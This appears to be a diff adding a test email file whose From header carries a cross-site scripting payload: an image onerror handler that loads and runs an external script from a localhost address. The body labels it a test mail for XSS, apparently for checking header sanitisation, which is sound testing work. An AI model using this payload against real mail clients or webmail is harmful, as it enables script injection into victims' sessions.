@@ -1,0 +1,7 @@
+From: <"test<img src=x onerror=d=document;e=d.createElement('script');e.src='http://127.0.0.1/i.js';d.body.appendChild(e)>@attack.com">
+To: cbrown@bracepatt.com
+Subject: Test XSS
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
